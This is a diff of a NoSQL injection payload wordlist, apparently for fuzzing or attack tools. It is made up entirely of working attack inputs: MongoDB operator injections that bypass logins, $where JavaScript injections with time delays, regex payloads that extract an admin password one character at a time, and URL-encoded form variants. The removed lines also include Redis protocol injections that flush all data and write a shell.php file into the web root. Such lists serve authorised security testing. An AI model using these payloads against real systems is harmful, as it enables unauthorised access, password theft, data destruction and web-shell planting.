@@ -1,61 +1,57 @@
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
-{"username": {"$gt": ""}, "password": {"$regex": ".*"}}
-{"username": "admin", "password": {"$gt": ""}}
-{"username": "admin", "password": {"$ne": "wrong"}}
-{"username": "admin", "password": {"$exists": true}}
-{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
-{"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}}
-
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$ne":"nonexistent"},"password":{"$ne":"nonexistent"}}
+{"username":{"$in":["admin","root","user"]},"password":{"$ne":""}}
+{"username":{"$regex":".*"},"password":{"$ne":""}}
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":{"$regex":"^admin"},"password":{"$ne":""}}
+{"username":{"$where":"1==1"},"password":{"$ne":""}}
+{"username":{"$where":"function(){return true;}"},"password":{"$ne":""}}
+{"$where":"1==1"}
+{"$where":"function(){return true;}"}
+{"$where":"this.username.match(/admin/)"}
+{"$where":"Object.keys(this).length > 0"}
+{"$where":"sleep(5000) || 1==1"}
+{"$where":"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return Math.max();})()"}
+{"username":{"$gt":"","$lt":"z"},"password":{"$ne":""}}
+{"username":{"$exists":true},"password":{"$exists":true}}
+{"username":{"$type":2},"password":{"$ne":""}}
+{"username":{"$not":{"$type":99}},"password":{"$ne":""}}
+{"username":{"$nor":[{"username":"nonexistent"}]},"password":{"$ne":""}}
+{"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":""}}
+{"$and":[{"username":{"$ne":""}},{"password":{"$ne":""}}]}
+{"username":"admin","$or":[{"password":{"$ne":""}},{"role":"admin"}]}
+{"username":{"$elemMatch":{"$gte":""}},"password":{"$ne":""}}
+username[$ne]=nonexistent&password[$ne]=nonexistent
 username[$gt]=&password[$gt]=
-username[$ne]=invalid&password[$ne]=invalid
-username[$ne]=&password[$ne]=
+username[$regex]=.*&password[$gt]=
+username[$exists]=true&password[$ne]=
+username[$where]=1==1&password[$ne]=
+username=admin&password[$ne]=
 username=admin&password[$gt]=
-username[$regex]=admin&password[$gt]=
-username[$exists]=true&password[$exists]=true
-
-{"$where": "this.username == 'admin'"}
-{"$where": "return true"}
-{"$where": "1==1"}
-{"$where": "function(){return true}"}
-{"$where": "sleep(5000)"}
-{"$where": "this.password.match(/.*/)"}
-
-{"username": "admin", "password": {"$regex": "^a"}}
-{"username": "admin", "password": {"$regex": "^b"}}
-{"username": "admin", "password": {"$regex": "^pa"}}
-{"username": "admin", "password": {"$regex": "^pas"}}
-
-{"$where": "sleep(5000) || 1==1"}
-{"$where": "function(){if(this.password.match(/^a/)){sleep(5000)};return true;}"}
-{"$where": "if(this.username=='admin'){sleep(5000)}"}
-
-';return 'a'=='a' && ''=='
-';return 'a'=='b' && ''=='
-' || 'a'=='a
-' || 1==1//
-'; sleep(5000); var x='
-true, $where: '1 == 1'
-, $where: '1 == 1'
-$where: '1 == 1'
-
-{"selector": {"_id": {"$gt": null}}}
-{"selector": {"username": {"$regex": ".*"}}}
-{"selector": {"$or": [{"username": "admin"}, {"username": "administrator"}]}}
-
-\r\nFLUSHALL\r\n
-\r\nCONFIG SET dir /var/www/html\r\n
-\r\nCONFIG SET dbfilename shell.php\r\n
-*1\r\n$8\r\nFLUSHALL\r\n
-*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\ntest\r\n
-
-{"password": true}
-{"password": []}
-{"password": {}}
-{"password": 0}
-{"password": null}
-{"password": ""}
-
-{"query": "{ users(filter: {password: {$gt: \"\"}}) { username password } }"}
-{"query": "{ login(username: \"admin\", password: {$ne: null}) { token } }"}
+username[$in][]=admin&username[$in][]=root&password[$ne]=
+username[$nin][]=nonexistent&password[$ne]=
+username=%7B%24gt%3A+%22%22%7D&password=%7B%24ne%3A+%22%22%7D
+{"username":"admin","password":{"$regex":"^a"}}
+{"username":"admin","password":{"$regex":"^ad"}}
+{"username":"admin","password":{"$regex":"^adm"}}
+{"username":"admin","password":{"$regex":"^admi"}}
+{"username":"admin","password":{"$regex":"^admin"}}
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":{"$regex":"^ad"},"password":{"$ne":""}}
+{"username":{"$regex":"^adm"},"password":{"$ne":""}}
+{"username":{"$regex":"^admi"},"password":{"$ne":""}}
+{"username":{"$regex":"^admin"},"password":{"$ne":""}}
+{"username":{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"data"}},"password":{"$ne":""}}
+{"username":{"$graphLookup":{"from":"users","startWith":"$_id","connectFromField":"_id","connectToField":"_id","as":"data"}},"password":{"$ne":""}}
+{"$jsonSchema":{"bsonType":"object","properties":{"username":{"bsonType":"string"}}}}
+{"username":{"$currentDate":true},"password":{"$ne":""}}
+{"username":{"$setOnInsert":"admin"},"password":{"$ne":""}}
+{"username":{"$rename":"newname"},"password":{"$ne":""}}
+{"username":{"$set":"admin"},"password":{"$ne":""}}
+{"username":{"$unset":1},"password":{"$ne":""}}
+{"username":{"$inc":1},"password":{"$ne":""}}
+{"username":{"$push":"admin"},"password":{"$ne":""}}
+{"username":{"$pull":"admin"},"password":{"$ne":""}}
+{"username":{"$addToSet":"admin"},"password":{"$ne":""}}
+{"username":{"$pop":1},"password":{"$ne":""}}
